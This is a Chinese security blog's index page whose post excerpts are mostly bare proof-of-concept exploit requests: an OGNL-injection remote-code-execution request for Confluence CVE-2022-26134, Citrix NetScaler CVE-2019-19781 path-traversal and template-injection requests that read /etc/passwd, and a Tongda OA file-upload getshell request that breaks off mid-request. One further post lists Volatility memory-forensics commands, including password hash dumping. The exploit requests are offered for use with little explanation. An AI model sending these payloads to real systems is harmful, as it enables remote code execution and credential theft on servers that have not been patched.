<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/orange/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"ihongren.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":"auto","version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="一个酷爱编程的安全工程师">
<meta property="og:type" content="website">
<meta property="og:title" content="gelen&#39;s blog">
<meta property="og:url" content="https://ihongren.github.io/page/7/index.html">
<meta property="og:site_name" content="gelen&#39;s blog">
<meta property="og:description" content="一个酷爱编程的安全工程师">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="gelen">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://ihongren.github.io/page/7/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/7/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>gelen's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  
  <main class="main">


    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">gelen's blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
        
      </ul>


      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="gelen"
      src="/images/avatar2.gif">
  <p class="site-author-name" itemprop="name">gelen</p>
  <div class="site-description" itemprop="description">一个酷爱编程的安全工程师</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">75</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/o0x1024" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;o0x1024" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/o0x1024@gmail" title="E-Mail → o0x1024@gmail" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    


        <div class="twopeople">
               <div class="container" style="height:200px;">
                   <canvas class="illo" width="400" height="400" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 300px;"></canvas>
               </div>
               <script src="https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/js/twopeople1.js"></script>
               <script src="https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/js/zdog.dist.js"></script>
               <script id="rendered-js" src="https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/js/twopeople.js"></script>
               <style>
                   .twopeople{
                       margin: 0;
                       align-items: center;
                       justify-content: center;
                       text-align: center;
                   }
                   canvas {
                       display: block;
                       margin: 0 auto;
                       cursor: move;
                   }
               </style>
             </div>
        </div>



  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/CVE-2022-26134%E6%BC%8F%E6%B4%9E-Confluence-OGNL-%E6%B3%A8%E5%85%A5rce%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/CVE-2022-26134%E6%BC%8F%E6%B4%9E-Confluence-OGNL-%E6%B3%A8%E5%85%A5rce%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">CVE -2022-26134漏洞 (Confluence OGNL 注入rce漏洞)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:53:59 / 修改时间：11:47:57" itemprop="dateCreated datePublished" datetime="2024-09-10T09:53:59+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="版本范围："><a href="#版本范围：" class="headerlink" title="版本范围："></a>版本范围：</h4><p>Confluence Server&amp;Data Center ≥ 1.3.0</p>
<p>Atlassian Confluence Server and Data Center &lt;7.4.17<br>Atlassian Confluence Server and Data Center &lt;7.13.7<br>Atlassian Confluence Server and Data Center &lt;7.14.3<br>Atlassian Confluence Server and Data Center &lt;7.15.2<br>Atlassian Confluence Server and Data Center &lt;7.16.4<br>Atlassian Confluence Server and Data Center &lt;7.17.4<br>Atlassian Confluence Server and Data Center &lt;7.18.</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx[必填]</span><br><span class="line">User-Agent: python-requests/2.25.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/volatility%E5%B7%A5%E5%85%B7%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/volatility%E5%B7%A5%E5%85%B7%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" class="post-title-link" itemprop="url">volatility工具内存取证</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:53:32 / 修改时间：09:53:42" itemprop="dateCreated datePublished" datetime="2024-09-10T09:53:32+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="获取内存镜像的摘要信息"><a href="#获取内存镜像的摘要信息" class="headerlink" title="获取内存镜像的摘要信息"></a>获取内存镜像的摘要信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw imageinfo</span><br></pre></td></tr></table></figure>
<p>判断系统版本应该是 Win7SP1x64</p>
<h3 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h3><p>pslist 可以直接列出运行的进程，如果进程已经结束，会在 Exit 列显示日期和时间，表明进程已经结束</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure>

<h3 id="查看隐藏进程"><a href="#查看隐藏进程" class="headerlink" title="查看隐藏进程"></a>查看隐藏进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 pstree</span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 psxview</span><br></pre></td></tr></table></figure>

<h3 id="列举缓存在内存的注册表"><a href="#列举缓存在内存的注册表" class="headerlink" title="列举缓存在内存的注册表"></a>列举缓存在内存的注册表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure>

<h3 id="提取主机名"><a href="#提取主机名" class="headerlink" title="提取主机名"></a>提取主机名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f mem.raw --profile=Win7SP1x64 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br></pre></td></tr></table></figure>

<h3 id="提取自启动项"><a href="#提取自启动项" class="headerlink" title="提取自启动项"></a>提取自启动项</h3><p>提取内存中保留的 cmd 命令使用情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f name --profile=WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure>
<p>获取到当时的网络连接情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">volatility -f name --profile=WinXPSP2x86 netscan</span><br><span class="line">````</span><br><span class="line">### 提取 ip 地址和主机名</span><br></pre></td></tr></table></figure>
<p>volatility -f name –profile&#x3D;WinXPSP2x86 netscan | grep ESTABLISHED</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userassist 键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等</span><br></pre></td></tr></table></figure>
<p>volatility -f name –profile&#x3D;WinXPSP2x86 userassist</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### 获取 SAM 表中的用户 ：</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">显示每个进程的加载 dll 列表</span><br></pre></td></tr></table></figure>
<p>Volatility -f name -profile &#x3D; Win7SP0x86 dlllist&gt; dlllist.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### 扫描内存中的文件</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 filescan</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">filescan 也可以结合 grep 命令来进行筛选，比如</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 filescan | grep “doc|docx”<br>volatility -f mem.raw –profile&#x3D;Win7SP1x64 filescan | grep “flag”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 提取 flag 值</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x07f1b6c10 –dump-dir&#x3D;.&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 提取内存中保留的 cmd 命令使用情况</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 cmdline</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 提取出内存中记录的 当时正在运行的程序</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.vmem –profile&#x3D;Win7SP1x64 userassist</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 提取网络连接情况</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 netscan</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 提取 IE 浏览器历史</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 iehistory</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### 提取系统密码（hashdump）</span><br><span class="line">直接 hashdump</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 hashdump</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">注册表 system 的 virtual 地址</span><br><span class="line">SAM 的 virtual 地址</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dump 出来密码</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.vmem –profile&#x3D;Win7SP1x64 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）<br>volatility -f mem.vmen –profile&#x3D;Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a000867010</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 提取迁移后的进程编号</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 malfind</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### 提取开机自启项的 Virtual 地址</span><br></pre></td></tr></table></figure>
<p>volatility -f mem.raw –profile&#x3D;Win7SP1x64 printkey -K “SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce”<br>volatility -f mem.raw –profile&#x3D;Win7SP1x64 printkey -K “SOFTWARE\Microsoft\Windows\CurrentVersion\Run”</p>
<pre><code>
### 参考
https://blog.csdn.net/qq_60115503/article/details/124818819
</code></pre>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/CVE-2019-19781-citrix-NetScaler-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86-rce%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/CVE-2019-19781-citrix-NetScaler-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86-rce%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">CVE-2019-19781 citrix NetScaler 路径遍历 rce漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:52:56 / 修改时间：11:46:09" itemprop="dateCreated datePublished" datetime="2024-09-10T09:52:56+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://xx.xx.xx.xx/vpn/../vpns/services.html</span><br><span class="line">https://xx.xx.xx.xx/vpn/../vpns/smb.conf</span><br><span class="line">如果没有修复的话的会返回 http 200</span><br></pre></td></tr></table></figure>


<h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1</span><br><span class="line">Host: 192.168.3.244</span><br><span class="line">User-Agent: 1</span><br><span class="line">Connection: close</span><br><span class="line">NSC_USER: ../../../netscaler/portal/templates/jas502n</span><br><span class="line">NSC_NONCE: nsroot</span><br><span class="line">Content-Length: 97</span><br><span class="line"> </span><br><span class="line">url=http://example.com&amp;title=jas502n&amp;desc=[% template.new(&#x27;BLOCK&#x27; = &#x27;print `cat /etc/passwd`&#x27;) %]</span><br></pre></td></tr></table></figure>

<h4 id="请求上传的文件"><a href="#请求上传的文件" class="headerlink" title="请求上传的文件"></a>请求上传的文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /vpn/../vpns/portal/jas502n.xml HTTP/1.1</span><br><span class="line">Host: 192.168.3.244</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">NSC_USER: nsroot</span><br><span class="line">NSC_NONCE: nsroot</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/%E9%80%9A%E8%BE%BEOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/%E9%80%9A%E8%BE%BEOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/" class="post-title-link" itemprop="url">通达OA文件上传&文件包含getshell</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:52:38 / 修改时间：10:01:50" itemprop="dateCreated datePublished" datetime="2024-09-10T09:52:38+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="漏洞等级：高危"><a href="#漏洞等级：高危" class="headerlink" title="漏洞等级：高危"></a>漏洞等级：高危</h4><h4 id="漏洞影响版本："><a href="#漏洞影响版本：" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">V11版</span><br><span class="line">2017版</span><br><span class="line">2016版</span><br><span class="line">2015版</span><br><span class="line">2013增强版</span><br><span class="line">2013版</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">任意文件上传漏洞  /ispirit/im/upload.php</span><br><span class="line">本地文件包含漏洞  /ispirit/interface/gateway.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">有些版本gateway.php路径不同</span><br><span class="line">如2013:</span><br><span class="line">/ispirit/im/upload.php</span><br><span class="line">/ispirit/interface/gateway.php</span><br><span class="line">2017：</span><br><span class="line">/ispirit/im/upload.php</span><br><span class="line">/mac/gateway.Php</span><br><span class="line">本文使用的v11版本路径为</span><br><span class="line">/ispirit/im/upload.php</span><br><span class="line">/ispirit/interface/gateway.php</span><br><span class="line">访问任意文件上传漏洞路径/ispirit/im/upload.php</span><br></pre></td></tr></table></figure>

<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>这里使用了COM组件wscript.shell来绕过disable_function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/1.1</span><br><span class="line">Host: 10.103.51.104</span><br><span class="line">Content-Length: 655</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, 